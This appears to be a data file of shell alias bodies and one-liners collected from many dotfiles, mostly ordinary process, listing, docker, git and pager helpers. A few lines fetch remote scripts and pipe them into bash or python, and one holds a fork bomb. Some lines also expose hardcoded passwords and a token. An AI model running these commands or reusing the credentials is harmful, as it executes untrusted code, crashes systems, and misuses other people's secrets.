"_cntline(){find . -name ""*.$1"" -print | xargs wc -l}; _cntline"
"_a()(command pacman -Ql ""$@"" | grep -P ""/bin/(?!\$)""); _a "
"_a()(command dpkg -L ""$@"" | grep -P ""/bin/(?!\$)""); _a"
"__with_gpg "" -n | --netrc "" curl --netrc-file ~/.netrc.gpg"
"__pslsa() { local p=""$1""; ps -f -l -p -u -s -W | head -n ${p:=101}; unset -f __pslsa; }; __pslsa"
"__pslsa() { local p=""$1""; ps -e -o pid,uname,comm,pcpu,pmem,etime,cmd --sort=-pcpu,-pmem | head -n ${p:=101}; unset -f __pslsa; }; __pslsa"
"__psls() { local p=""$1""; watch -n 0.1 ""ps -e -o pid,uname,comm,cmd,pcpu,pmem --sort=-pcpu,-pmem | head -n ${p:=11}""; unset -f __psls; }; __psls"
"__play-youtube_() { youtube-dl -q -o- ""${1}"" | mplayer -cache 8192 -; }; __play-youtube_"
"__memls() { local p=""$1""; ps -e -o pid,uname,comm,cmd,pmem,pcpu --sort=-pmem,-pcpu | head -n ${p:=11}; unset -f __memls; }; __memls"
"__lsfhidden() { local p=""$1"";ls --almost-all -lhd $(realpath ${p:-$(pwd)})/.??* 2>/dev/null | grep -v ^d; unset -f __lsfhidden; }; __lsfhidden"
"__lsfhidden() { local p=""$1""; ls --almost-all -lha $(realpath ${p:-$(pwd)})/.??* 2>/dev/null | grep -v ^d; unset -f __lsfhidden; }; __lsfhidden"
"__lambda() { find . -type f | xargs perl -pi -e ""s/$1/$2/g;"" ; } ; __lambda"
"__grepdel() { sudo btrfs subvol list ""$1"" | awk -v p=""$2"" "
"__drmvol() { docker volume ls -q ""$@"" | xargs -r docker volume rm; }; __drmvol"
"__drmnet() { docker network ls -q -f type=custom ""$@"" | xargs -r docker network rm; }; __drmnet"
"__drmia() { docker images -q ""$@"" | xargs -r docker rmi -f; }; __drmia"
"__drma() { docker ps -aq ""$@"" | xargs -r docker rm -f; }; __drma"
"__cpuls() { local p=""$1""; ps -e -o pid,uname,comm,cmd,pcpu,pmem --sort=-pcpu,-pmem | head -n ${p:=11}; unset -f __cpuls; }; __cpuls"
"__calc () { echo ""scale=4; $*"" | bc; }; __calc "
"__(){ hexo clean && hexo g && hexo d && echo -e ""a\n*\nq\n""| git add -i && git add -u && git commit -m ""backup"" && git pm; };__"
"_(){ { command=""$1 $2 $3 $4 $5 $6 $7 $8;""; command=command | sed -e ""s/[\s\n\t\r]*;$//""; $command > /dev/null 2>&1; echo -e ""Process Finished \e[100m"" $command ""\e[0m""; } & }; _"
"_(){ ls --color=auto -p ""$@"" ; lfind . ! -name . -prune -print | grep -c /; }; _"
"_(){ ll ""$@""|more; }; _"
"_(){ la $@| \grep ^l; && echo ""\nNo more linked files!""; }; _"
"_(){ hexo clean && hexo g && hexo d && echo -e ""a\n*\nq\n""| git add -i && git add -u && git commit -m ""backup"" && git pm; };_"
"_(){ grep ""$1"" -r . | awk -F"
"_(){ find . -print | grep -i ""$1"";}; _"
"_(){ /bin/ls -F -1 -A ""\$@""|cf${COLUMN_PIPE};};_"
"_() { local port; local args; port=3000; args=$@; while [[ $1 != """" ]]; do case $1 in -p | --port ) shift; port=$1; break;; *) shift;; esac; done; eval docker run -it --rm -p $port:$port -v $PWD:/data zheeeng/json-server "
"_() { git log --pretty=format:""%h : %an : %s"" | ${AWKCMD} ${AWKACTFILE} -v ACT=$1;};_"
"][^=]*\)='\''\([^ ][^ ;]*\) *\([^|]*\)'\''/_wrap_alias \1 '\''\2'\'' '\''\3'\'' /p')"""
"]+)='(\""[^\""]+\""|[^ ]+)(( +[^ ]+)*)'"""
"]*\)='cd \([^']*\)'/\1 -> \2/"" | sort"
"]""|cut -c7-"
"\system_profiler -detailLevel mini | sed ""/^Printer Software:/,/^ *Library Extensions/d"""
"\ps wwaxr -o pid,stat,%cpu,time,command | head -10"
"\ps wwaxm -o pid,stat,vsize,rss,time,command | head -10"
"\ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head"
"\ps -e -o pid,rss,vsz,command | grep"
"\nmcli | sed -n '/^DNS /,+3p'"
"\ls -t *.zip | parallel unzip ""{}"""
"\ls -t *.rar | parallel unrar x ""{}"" ."
"\ls -l | fgrep -e ""->"" "
"\ls -ald $LS_OPTIONS err.txt generated.file succ.txt | egrep ""^d"""
"\ls -alFqh --color=none --time-style=long-iso |/bin/grep ""`date --rfc-3339=date`"""
"\ls -F | grep ""/"""
"\ls -F | command grep ""/"""
"\ls --color=auto -1 | grep ""(^\w*[^_-])"""
"\history -n -r 1 | grep ""$@"""
"\grep -vE ""^\s*#|^\s*$"""
"\grep -h ""^You unwrap the papyrus envelope and toss it away"" ~/lich/logs/GSIV-*/`date +%Y`-* | wc -l"
"\git ls-remote --tags --sort=""version:refname"" | awk -F/ "
"\find . -follow -printf """" 2>&1 | grep -v ""Permission denied"""
"\echo $PATH | tr "":"" ""\n"""
"\du -ahd 0 2> >(grep -v ""^du: cannot \(access\|read\)"" >&2)"
"\0047history | grep \0047' >> ~/.bashrc"""
"\).*$/\1\'ls -lF\'/"" | \"
"\).*$/\1\'ls -alF\'/"" | \"
"\([\'\""]\)\(.*\)\1/\2/""| sed 's/^[^ ]\+=[^ ]\+ //g')"
"\'xev | awk -F\'[ )]+\' \'/^KeyPress/ { a[NR+2] } NR in a { printf ""%-3s %s\n"", $5, $8 }\''"
"\'vim ""$(find -L -type f | fzf)""\''"
"\'docker inspect `did` \| jq -r \"".[0].NetworkSettings.IPAddress\""\' >> /home/nicogiard/.bash_aliases"""
"\'cd ""$(find -L -type d | fzf)""\''"
"\'`echo ""${2}"" | sed ""s:':'\\\\\\\\'':""`\'"
"\'`echo ""${2}"" | sed ""s:':'\\\\\\\\'':""`\' ;;"
"\'/system/xbin/\1\'|"" <SDCARD>/.gnualiases"
"\'$(echo ""${2}"" | sed ""s:':'\\\\'':g"")\' ;;"
"\'$(echo ""${2}"" | sed ""s:':'\\\\'':"")\'"
"\'$(echo ""${2}"" | sed ""s:':'\\\\'':"")\' ;;"
"\""~/.gitcom""\"" | sudo tee -a $FILE"
"\""wget -q -O - ${HTTP}/test2 \| /bin/bash\"""
"\""wget -q -O - ${HTTP}/test1 \| /bin/bash\"""
"\""vim -R \$ORACLE_BASE/diag/rdbms/\$(echo \$ORACLE_UNQNAME | tr 'A-Z' 'a-z')/\$ORACLE_SID/trace/alert_\$ORACLE_SID.log\"""
"\""vendor/behat/behat/bin/behat\""\n"" | tee -a /home/vagrant/.zshrc.local"
"\""trash-put\"""" | sudo tee /etc/profile.d/trash-cli.sh"
"\""top -o wq -n 0 -s 1 -l 0 | perl -pe 's/\n/ - /; s/Processes/\nProcesses/'\"""
"\""tmux -2\"""" | tee -a $HOME/.bashrc"
"\""tmux -2\"""" | sudo tee -a /etc/bash.bashrc"
"\""tee /dev/tty | xclip -selection clipboard\""' >> /etc/bash.bashrc"""
"\""tar -zxvf\"""" | sudo tee --append ~/.bashrc > /dev/null"
"\""sudo sync && echo 3 | sudo tee /proc/sys/vm/drop_caches\"""" >> /home/$username/.zshrc"
"\""sudo apt upgrade && sudo apt dist-upgrade\"""" | sudo tee --append ~/.bashrc > /dev/null"
"\""sudo apt purge\"""" | sudo tee --append ~/.bashrc > /dev/null"
"\""sudo apt install\"""" | sudo tee --append ~/.bashrc > /dev/null"
"\""sudo apachectl restart\""""$'\n'""alias hosts=\""mate /etc/hosts\""""$'\n'""alias vhosts=\""mate /etc/apache2/extra/httpd-vhosts.conf\""""$'\n'""alias phpini=\""mate /etc/php.ini\""""$'\n'""alias apachecnf=\""mate /etc/apache2/httpd.conf\""""$'\n'""alias dns-cache=\""dscacheutil -flushcache\"""" | sudo tee -a ~/.bash_profile"
"\""stern -n kube-system apiserver | grep -E ' [3-9][0-9][0-9] '\"""" >> /root/.bashrc"
"\""ssh -i ~/.ssh/aws-key.pem ubuntu@$instanceUrl\"" | tee --a ai_aliases.sh "
"\""ssh -X ""$3""@""$4""\""""}' | tee ~/.config/targets_alias"
"\""ssh ""$3""@""$4""\""""}' | tee ~/.config/targets_alias"
"\""source ~/.zshrc && echo '| tee OH MY, ZSH configurations are reloaded! '\"""" >> ~/.zshrc"
"\""rm -i\"""" | tee -a ""${sCurrent}"" > /dev/null 2>&1"
"\""quote_${FORTUNE_NAME} | cowsay\"""" >> $ALIASES_FILE"
"\""python3\"""" | sudo tee -a /home/pi/.bashrc"
"\""python3 /home/pi/shoecam/shoecam.py\"""" | sudo tee -a /home/pi/.bashrc"
"\""python /opt/groupthreads-cli/groupthreads.py\"""" | tee -a ~/.'""$SHELL_CONFIG"""
"\""ps -afe | grep \"""" >> ~/.zshrc"
"\""printf '\x1f\x8b\x08\x00\x00\x00\x00\x00' | cat - \"""""
"\""pip3\"""" | sudo tee -a /home/pi/.bashrc"
"\""parec -d ${stereo_out} | lame -r -V0 - \"""" >> ~/.zshrc"
"\""pacman -Sg | grep blackarch\"""" >> ${EXT_SDCARD}/.bashrc"
"\""mysql -uroot -proot -h127.0.0.1 --port=3357 --show-warnings\"""" | sudo tee -a /etc/bash.bashrc > /dev/null"
"\""mv -i\"""" | tee -a ""${sCurrent}"" > /dev/null 2>&1"
"\""lsof -i TCP -n -P | grep LISTEN\"""" >> ~/.bash_profile # show listening ports"
"\""ls -l \|more\"" >> $strBashrc"
"\""ls -halF\"" "" | sudo tee -a /root/.bashrc"
"\""ls -halF\"" "" | sudo tee -a /home/vagrant/.bashrc"
"\""ls -al\"""" >>/root/.profile' | sudo at now"
"\""ls -alG | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\\\"" %0o \\\"",k);print}'\"""" >> ~/.bashrc # doesn't format correctly when printed"
"\""ls -al | grep ^d\"" "
"\""ll | more\"""
"\""jupyter lab --port=\${JUPYTER_PORT} --ip=\${JUPYTER_IP} --no-browser --NotebookApp.password='sha1:\${JUPYTER_SECRET}' --NotebookApp.notebook_dir=/projects --certfile=${HOME}/.ssh/jupyter.pem --allow-root \"" "" | tee -a ${HOME}/.bashrc"
"\""jupyter lab --port=\${JUPYTER_PORT} --ip=\${JUPYTER_IP} --no-browser --NotebookApp.password='sha1:\${JUPYTER_SECRET}' --NotebookApp.notebook_dir=/projects --allow-root \"" "" | tee -a ${HOME}/.bashrc"
"\""jupyter lab --port=\${JUPYTER_PORT} --ip=\${JUPYTER_IP} --no-browser --NotebookApp.notebook_dir=/projects --allow-root \"" "" | tee -a ${HOME}/.bashrc"
"\""ip addr | awk '/inet/ {print $2}'\"""" >> $ALIASES"
"\""inist --status | grep ' on '\"""" >> ~/.zshrc"
"\""inist --status | grep ' on '\"""" >> ~/.bashrc"
"\""ifconfig | grep inet\\ addr && python3 -m http.server\"""""
"\""ifconfig | grep inet && python3 -m http.server\"""""
"\""ifconfig eth0 | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'\"""" >> .bashrc"
"\""ifconfig -a | perl -nle'/(\d+.\d+.\d+.\d+)/ && print \$1'\"""
"\""history | grep\""\n"" >> $HOME/.bash_aliases"
"\""grep --color=auto\""\nalias hgrep=\""fc -El 0 | grep\""\t#Grep history\nalias diff=\""diff --color=auto\""\n"" >> $usr_home/.config/aliases.sh"
"\""git status && git log | head\"""" >> $HOME/.zshrc"
"\""git reset --hard; git clean -df;\"""" | sudo tee /etc/profile.d/shared-alias.sh"
"\""git branch| awk '{printf(\\\""%3d: %s\n\\\"", NR, \\\$0)}'\"""" >> ~/.bashrc"
"\""find '\$PWD' -name\""\n alias python='python3'\n alias hg='history | grep'\n alias pip3='python3 -m pip'\n alias pip='python3 -m pip'"" >> ~/.zshrc"
"\""egrep '""'""'WARN|ERROR'""'""' /var/log/cassandra/system.log\"" >> ~/.bashrc"""
"\""echo mem | sudo tee /sys/power/state > /dev/null\"""" >> /home/ljosalfur/.bashrc"
"\""echo ji | sudo sync;sudo sync;sudo sync;sudo -S reboot\"""
"\""docker run -ti --rm -v ~/teutonetes/cluster:/root/cluster/ -v /home/$(whoami)/.kube:/root/.kube/ -w /root/ -e UID=$UID -e GID=$(grep "":$UID:"" /etc/passwd | cut -d"":"" -f4) --env-file ~/teutonetes/$cluster_name/.config registry-gitlab.teuto.net/technik/teutonetes:latest"
"\""django-admin\"""" | sudo tee -a /home/vagrant/.virtualenvs/api/bin/postactivate;"
"\""dfc -d\"""" | tee -a ~/.bashrc"
"\""date +'%Y%m%d' | clipcopy\"""
"\""curl https://getmic.ro | bash && sudo mv ./micro /usr/local/bin/\"""
"\""curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python -\"""" >> $HOME/.bashrc'"
"\""cp -i\"""" | tee -a ""${sCurrent}"" > /dev/null 2>&1"
"\""cd \\\""""$0""\\\"" && ls -a\""""}' | sed 's/ ~/$HOME/'>> $shell_shortcuts) \"
"\""cd \$(ghq list -p | peco)\"""" >> /target-home/.bashrc"
"\""cd ..\"""" | tee -a ~/.post-aliases"
"\""cd ""$2"" && ls -a\""""}' >> ""$shell_shortcuts"") | awk '{print ""map g""$1"" cd ""$2""\nmap t""$1"" tab_new ""$2""\nmap m""$1"" shell mv -v %s ""$2""\nmap Y""$1"" shell cp -rv %s ""$2}' >> ""$ranger_shortcuts"""
"\""ccze -m ansi | less -MnFRX\"""" >> ~/.bashrc"
"\""bash $installation_path/resume-iitb.sh\"""" ~/.bashrc | wc -l )"
"\""alias | grep -v sudo\"""" >> ~/.bashrc"
"\""alias | grep -v sudo\"""" >> ~/.bash_profile"
"\""\""$' ${FILE_WITH_ALIAS} | wc -l)"
"\"":(){ :|:& }:\"""""
"\""/vagrant/vendor/bin/psysh\"""" | tee -a /root/.bash_aliases /home/ubuntu/.bash_aliases"
"\""/vagrant/vendor/bin/phpunit\"""" | tee -a /root/.bash_aliases /home/ubuntu/.bash_aliases"
"\""/opt/sentilo-server/bin/sentilo-server\"""" | sudo tee -a ~/.bashrc"
"\""/opt/sentilo-agent-relational/bin/sentilo-agent-relational-server\"""" | sudo tee -a ~/.bashrc"
"\""/opt/sentilo-agent-location-updater/bin/sentilo-agent-location-updater-server\"""" | sudo tee -a ~/.bashrc"
"\""/opt/sentilo-agent-historian/bin/sentilo-agent-historian-server\"""" | sudo tee -a ~/.bashrc"
"\""/opt/sentilo-agent-alert/bin/sentilo-agent-alert-server\"""" | sudo tee -a ~/.bashrc"
"\""/opt/sentilo-agent-activity-monitor/bin/sentilo-agent-activity-monitor-server\"""" | sudo tee -a ~/.bashrc"
"\""/opt/sentilo-agent-activity-monitor/bin/sentilo-agent-activity-monitor-server\"""" | sudo tee -a ~/.bashrc "
"\""./flow\""\n"" | tee -a /home/vagrant/.zshrc.local"
"\"". /usr/share/mc/bin/mc-wrapper.sh\"""" | tee -a ~/.bashrc >/dev/null"
"\"". /opt/local/libexec/mc/mc-wrapper.sh\"""" | tee -a ~/.bashrc >/dev/null"
"\""(cd \`echo \$ROS_PACKAGE_PATH | awk -Fsrc: '{print \$1}'\` && catkin_make)\"""" >> sourceror.sh"
"\""$tempAliasCommand\"""" | sudo tee -a ~/.bashrc > /dev/null 2>&1"
"\""$EDITOR ""$2""\""""}' >> ""$shell_shortcuts"") | awk '{print ""map ""$1"" shell $EDITOR ""$2}' >> ""$ranger_shortcuts"""
"\"" /afs/cern.ch/project/eos/installation/cms/etc/setup.sh | sed \""s/alias /export my/\"" >> eosenv.sh"" >> $OUTPUT"
"[[ -z $(mount | grep /shared) ]] && sudo mount -t ntfs-3g -o umask=022,gid=998,uid=1000 /dev/sda5 /shared"
"[[ ""${TERM}"" =~ ^(rxvt|xterm) ]]"
"[ -n ""${GRADLE_HOME}"" ] && pathremove ""${GRADLE_HOME}/bin""; unset GRADLE_HOME; GRADLE_HOME=`find /opt/gradle -name ""gradle-5*"" -type d -maxdepth 1 | tail -n 1`; pathappend ""${GRADLE_HOME}/bin""; export PATH; export GRADLE_HOME; which gradle"
"[ -n ""${GRADLE_HOME}"" ] && pathremove ""${GRADLE_HOME}/bin""; unset GRADLE_HOME; GRADLE_HOME=`find /opt/gradle -name ""gradle-4*"" -type d -maxdepth 1 | tail -n 1`; pathappend ""${GRADLE_HOME}/bin""; export PATH; export GRADLE_HOME; which gradle"
"[ -n ""$VIRTUAL_ENV"" ] && (python --version |& grep ""Python 2"" > /dev/null) && deactivate; ipython3"
"[ -n ""$TMUX"" ] && eval $(tmux show-env -s |grep ""^SSH_""); /usr/bin/ssh"
"[ ""$(ls -b *sln | wc -l)"" -le 1 ] && start *sln"
"[ ""$(git rev-parse --is-inside-work-tree 2>/dev/null)"" == ""true"" ] && git switch ""$(git reflog | grep "
"XZ_OPT=""-9 -T 0"" tar cfJh - ${mybackup_files[*]} | gpg2 --symmetric --s2k-cipher-algo AES256 --s2k-digest-algo SHA512 --s2k-count 65011712 -o $(date +""%Y-%m-%d"").tar.xz.gpg"
"VBoxManage showvminfo ""$_id"" | grep -i ^State"
"VBoxManage list vms | sed ""s/\""\(.*\)\"".*/\1/"""
"VBoxManage guestproperty get ""Linux"" ""/VirtualBox/GuestInfo/Net/0/V4/IP"" | cut -f2 -d """""
"V -c ""set cole=0 fdl=1|setf ag_grp"""
"V -c ""cgetb|copen"""
"TizenPM show-pkgs | grep -E ""^ni"""
"TOKEN=0YWRtaW58MTM3OTQ4MjA2MjU5MXxBRGNzdDN5cU1wcmw0WjR0UlpLTzd3eUdUbGJwcVp6ejl3 last_complete_day |sort --key=2,1"
"TMUXDISPLAY=""$(tmux show-env -g DISPLAY | sed -n s/^DISPLAY=//p)"" echo ""Setting DISPLAY=$TMUXDISPLAY"" && export DISPLAY=$TMUXDISPLAY"
"TF_CMD=$(TF_ALIAS=fuck PYTHONIOENCODING=utf-8 TF_SHELL_ALIASES=$(alias) thefuck $(fc -ln -1 | tail -n 1)) && eval $TF_CMD ; test -n ""$TF_CMD"" && print -s $TF_CMD"
"TF_CMD=$(TF_ALIAS=fk PYTHONIOENCODING=utf-8 TF_SHELL_ALIASES=$(alias) thefuck $(fc -ln -1 | tail -n 1)) && eval $TF_CMD ; test -n ""$TF_CMD"" && print -s $TF_CMD"
"TASTY_HEDGEHOG_TESTS=5 ghcid -c ""stack ghci grid:lib grid:grid-test --ghci-options=-fobject-code"" --warnings --test ""Main.main"" | source-highlight -s haskell -f esc"
"TAG=""$(git_lasttag | awk -F. "
"SAVEIFS=$IFS; IFS=$(echo -en ""\n\b""); for i in $(find . -type f -not -path ""**/.git/*""); do echo ""$(git log -1 --format=""%ci"" $i) $i""; done | sort -n; IFS=$SAVEIFS"
"PS1=$(echo $PS1|sed ""s/w/W/g"")"" "";"
"PS1=""\[\033[1;33m\]\A \u@\h:\w (\$(git branch 2>/dev/null | grep "
"PS1=""$mblue┌─($orange$mblue\!|$orange \s--\j jobs--\$(date \""+%a, %d %b %y\"")$mblue)─\${fill}─($orange\$newPWD$mblue)─┐\n$mblue└─($orange\$(date \""+%H:%M\"")$mblue)─>$unset """
"PGPASSWORD=$(sudo cat /home/secrets/psql.env | awk ""-F="" ""{print \$2}"") psql -h localhost -U postgres'"
"PATH=$(echo ""$PATH"" | sed -e ""s/\/Users\/.*\.nodenv[^:]*://"") nvim"
"PASSWORD=$( pass work/wustlkey ); echo $PASSWORD | sudo -S -p """" openconnect --user accounts\\mcallawa --servercert sha256:66269829fe650aadc5e20ffd47d46db1fe897b5f95856aba80d552996f522187 https://msvpn.wusm.wustl.edu"
"PAGER=""colordiff | less -RS"" git log -cc"
"PAGER=""col -b | open -a /Applications/Google\ Chrome.app -f"" man"
"PAGER="""" git diff $ | skate --language diff -"
"OLD=$(pwd) ; cd /home/ugo/Documents/git/firewall; for i in $(ls /home/ugo/Documents/git/firewall); do cd $i && (echo -ne ""$i"" | sed ""s/\//: /"") && git pull && cd ../; done; cd $OLD"
"NOMAD_ADDR=""http://$(dig @smazurov.docker.qa.lamoda.tech +short http.nomad.service.consul | head -1):4646"" nomad"
"MOZ_QUIET=1 ./mach run -P development -purgecaches |& grep -v -e ""bootstrap_register"" -e ""bootstrap_defs"" -e ""presentFunctionRowItemTextInputViewWithEndpoint"" -e ""VR Path Registry"""
"MANPAGER=""sed -e G |less"" TERMINFO=~/.terminfo TERM=mostlike /usr/bin/man"
"LESSOPEN=""|pygmentize -g %s"" less"
"LESSOPEN=""|pygmentize -g %s"" less -R"
"LESSOPEN=""|lessfilter %s"" less"
"LESSOPEN=""|emacs --batch -l /opt/e2ansi/e2ansi-silent -l ~/.emacs.d/.emacs -l /opt/e2ansi/bin/e2ansi-cat %s"" less"
"LESSOPEN=""| src-hilite-lesspipe.sh %s"" less"
"LESSOPEN=""| src-hilite-lesspipe.sh %s"" less -R -M "
"LESSOPEN=""| src-hilite-lesspipe.sh %s"" less -M "
"LESSOPEN=""| src-hilite-lesspipe.sh %s"" LESS="" -R "" less -N"
"LESSOPEN=""| source-highlight-esc.sh %s"" less -M"
"LESSOPEN=""| source-highlight %s -o STDOUT"" less -M "
"LESSOPEN=""| rougify %s"" less -RM"
"LESSOPEN=""| pygmentize -g -f terminal256 -O style=monokai %s"" less"
"LESSOPEN=""| pygmentize -g %s"" less"
"LESSOPEN=""| pygmentize -g %s"" less -RM"
"LESSOPEN=""| ls -alF --color %s"" less"
"LESSOPEN=""| /usr/share/source-highlight/src-hilite-lesspipe.sh %s"" less"
"LESSOPEN=""| /usr/share/source-highlight/src-hilite-lesspipe.sh %s"" less "
"LESSOPEN=""| /usr/local/bin/src-hilite-lesspipe.sh %s"" less -M "
"LESSOPEN=""| /usr/bin/src-hilite-lesspipe.sh %s"" less -M"
"LESSOPEN=""| /usr/bin/src-hilite-lesspipe.sh %s"" less -M "
"LESSOPEN=""| /usr/bin/src-hilite-lesspipe.sh %s"" less --LONG-PROMPT --LINE-NUMBERS "
"LESSOPEN=""| ${LESSPIPE} %s"" less"
"LESSOPEN=""| ${LESSPIPE} %s"" less -M "
"LESSOPEN=""| $HIGHLIGHT/src-hilite-lesspipe-bio.sh %s"" less -R -Si -# 10"
"LESS=""-R"" LESSOPEN=""|~/etc/lessfilter %s"" LESSCLOSE=""~/etc/lessfilter %s %s"" less"
"LESS=""-R"" LESSOPEN=""|pygmentize -g %s"" less"
"LESS=""-R"" LESSOPEN=""|pygmentize -g %s"" less -N"
"LESS=""-R"" LESSOPEN=""| pygmentize -g %s"" less"
"LC_CTYPE=C tr -c -d ""[:graph:]"" < /dev/urandom | head -c 12"
"LC_CTYPE=C tr -c -d ""[:alnum:]"" < /dev/urandom | head -c 12"
"LC_ALL=C tr -dc ""[:alpha:][:alnum:]"" < /dev/urandom | head -c 20"
"LC_ALL=C tar --verbose --create --file - --sort=name --files-from ~/.config/backup_config.txt --ignore-failed-read | gzip --no-name > ""$(date -I)_backup_config_files-$(hostname).tar.gz"""
"IP=`ipconfig getifaddr en0`; echo ""${IP}""; echo ""${IP}"" | pbcopy"
"IP=`dig +short myip.opendns.com @resolver1.opendns.com`; echo ""${IP}=> IP copied to clipboard.""; echo ""${IP}"" | pbcopy"
"IP=`dig +short myip.opendns.com @resolver1.opendns.com`; echo ""${IP}""; echo ""${IP}"" | pbcopy"
"HRPL/usr/sbin/sshvpn"",$1""HRPL""}' | sed -e 's/HRPL/""/' -e 's/HRPL/""/' >> build/alias"
"HOME=$PWD cd $(find ""$HOME"" -maxdepth 4 -type d | fzf)"
"HASH=`git rev-parse --short HEAD` && echo $HASH && printf ""%s "" $HASH | pbcopy"
"G_SLICE=always-malloc G_DEBUG=gc-friendly valgrind --tool=memcheck --num-callers=50 --leak-check=full --track-origins=yes --xml=yes --xml-file=""unity-valgrind.xml"" --log-file=unity-valgrind.20120409T160245.xml compiz --replace 2>&1 | tee ~/unity-valgrind.20120409T160245.log"
"GIT_EDITOR=""mvim -f"" hub pull-request $@ | pbcopy"
"FILESTOTESTNOW=$(git ls-files --modified | grep spec.rb); echo ""PERFORMING TESTS ON""; echo $FILESTOTESTNOW; zeus rspec $FILESTOTESTNOW"
"FILESTOTESTNOW=$(git ls-files --modified | grep spec.rb); echo ""PERFORMING TESTS ON""; echo $FILESTOTESTNOW; NO_PANDA=1 bin/rspec $FILESTOTESTNOW"
"EXP_DATE=$(date +""%Y%m%d_%H%M"") && echo PGPASSWORD=""papasofokli12"" pg_dump --file ""/mnt/db/ra_test_$(echo $EXP_DATE).db"" --host ""localhost"" --port ""5432"" --username ""postgres"" --no-password --format=c --blobs ""riveradvice@radiantfleet"" --verbose | ssh ratest bash -s && scp ratest:/mnt/db/ra_test_$(echo $EXP_DATE).db $HOME/Downloads/"
"EXP_DATE=$(date +""%Y%m%d_%H%M"") && echo PGPASSWORD=""papasofokli12"" pg_dump --file ""/mnt/db/ra_live_$(echo $EXP_DATE).db"" --host ""localhost"" --port ""5432"" --username ""postgres"" --no-password --format=c --blobs ""riveradvice@radiantfleet"" --verbose | ssh prod bash -s && scp prod:/mnt/db/ra_live_$(echo $EXP_DATE).db $HOME/Downloads/"
"EXP_DATE=$(date +""%Y%m%d_%H%M"") && echo PGPASSWORD=""papasofokli12"" pg_dump --file ""/mnt/db/hn_live_$(echo $EXP_DATE).db"" --host ""localhost"" --port ""5432"" --username ""postgres"" --no-password --format=c --blobs ""heinemann@radiantfleet"" --verbose | ssh heinemann bash -s && scp heinemann:/mnt/db/hn_live_$(echo $EXP_DATE).db $HOME/Downloads/"
"EXP_DATE=$(date +""%Y%m%d_%H%M"") && echo PGPASSWORD=""papasofokli12"" /opt/PostgreSQL/10/bin/pg_dump --file ""/home/ubuntu/db/smt_test_$(echo $EXP_DATE).db"" --host ""localhost"" --port ""5432"" --username ""postgres"" --no-password --format=c --blobs ""smt@radiantfleet"" --verbose | ssh smttest bash -s && scp smttest:/home/ubuntu/db/smt_test_$(echo $EXP_DATE).db $HOME/Downloads/"
"DRI_PRIME=1 glxinfo | grep ""OpenGL renderer"""
"DOWN=`fc -ln -1`;DOWN=${DOWN##* };if [ -d ""$DOWN"" ];then cd ""$DOWN"";else cd `ls -td {.[^.],}?*/ 2>/dev/null|head -1`;fi"
"DJID=$(docker ps --format ""{{.Names}}"" | grep dltdojo.1); docker exec -t $DJID node index.js"
"DIR=""$(ls -tu ~/code | fzf)"" && cd ~/code/""$DIR"""
"DATE=$(date +""%Y-%m-%d-%H-%M-%S"");mkdir -p ~/Desktop/ScreenCap;adb shell screencap -p | perl -pe ""s/\x0D\x0A/\x0A/g"" > ~/Desktop/ScreenCap/Screen_$DATE.png"
"D=/home/system/vids; find $D/ -name ""*.*"" -type f |sort >$D/vidlist; rsync -avzP $D/vidlist mac:files/txt/"
"D=/home/system/flac; find $D/ -name ""*.flac"" -type f |sort >$D/playlist.txt; rsync -avzP $D/playlist.txt mac:files/txt/"
"CURR_BRANCH=$(git symbolic-ref HEAD 2>/dev/null | cut -d""/"" -f 3-) && git co master && git pull && git co $CURR_BRANCH && git merge master"
"CURR_BRANCH=$(git symbolic-ref HEAD 2>/dev/null | cut -d""/"" -f 3-) && git co master && git pull && git co $CURR_BRANCH && git merge master && git push"
"CSCOPE_DB=$PWD\/cscope.out; export CSCOPE_DB; echo ""CSCOPE ENV now is as follows-""; env | grep CSCOPE"
"CLICOLOR_FORCE=true ls -lAGh | grep "":.. \."""
"CLICOLOR_FORCE=1 ll | grep --color=never ""^d"""
"CLICOLOR_FORCE=1 ll | grep --color=auto""^d"""
"CLICOLOR_FORCE=""yes"" /bin/ls -lRGF ""$@"" |less -R"
"CLICOLOR_FORCE=""yes"" /bin/ls -alFhG | less -R"
"CLASSPATH=""$CLASSPATH:$(echo $(find ${PWD}/../*/dist -name *.jar) | sed ""s/\s\+/:/g"")"" rpmbuild --nodeps --define ""_topdir ${PWD}/build/rpmbuild"" --rebuild build/rpmbuild/SRPMS/*.src.rpm"
"CDL_NUM=`wc -l $CDL_FILE | sed ""s/^ *\([0-9]*\).*$/\1/""`; ((CDL_NUM=CDL_NUM+1)); echo ""$CDL_NUM $PWD"" >> $CDL_FILE"
"C=`cat - | wc -c` && echo -e ""\n$C"""
"ACK_COLOR_MATCH=""bold red"" hl ""ERROR.*"" | ACK_COLOR_MATCH=""bold purple"" hl ""WARN.*"""
"=sacct -S $(date +""%m/%d"" -d ""-5hours"") -a -o User%10,JobID,Jobname,state%5,MaxRss,MaxVMSize,avediskread,nnodes%3,ncpus%3,nodelist,start%16,end%16,elapsed%5 | colorline"
"=sacct -S $(date +""%m/%d"" -d ""-4days"") -o jobid,jobname%30,alloccpus%3,reqmem%5,state%8,nodelist%16,start%16,end%16,elapsed%5 | colorline"
"=ls --color=auto -1 | grep ""(^\w*[^_-])"""
"</dev/urandom tr -dc ""[:graph:]"" | head -c16; echo"
"</dev/urandom tr -dc ""[:alnum:]"" | head -c12; echo"
"</dev/urandom tr -dc ""0123456789qwertyuiopasdfghjklzxcvbnm!@#$%^&*()QWERTYUIOPASDFGHJKLZXCVBNM"" | head -c48; echo """""
"</dev/urandom LC_CTYPE=C tr -dc ""!@#$%^&*()_A-Z-a-z-0-9"" | head -c30; echo """""
"< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c13; echo """""
"< /dev/urandom tr -dc A-Z,a-z,0-9 | head -c8"
"< /dev/urandom tr -dc ""a-zA-Z0-9"" | dd count=1 bs=12 2> /dev/null; echo"
"< /dev/urandom tr -dc ""[:graph:]"" | dd count=1 bs=12 2> /dev/null; echo"
"; notify-send -i gnome-terminal ""[$?] $(tail -n1 $HISTFILE | sed -e ""s/^:\s*[0-9]\+:[0-9]\+;//"" -e ""s/\s\+A$//"")"""
"2>/dev/null find {bin,bin-dev,node_modules,vendor}/ -type f -not -name ""*.*"" -exec grep -l -E ""^#!"" {} \; | xargs -r chmod 0775"
"2>&1 | tee ,log"
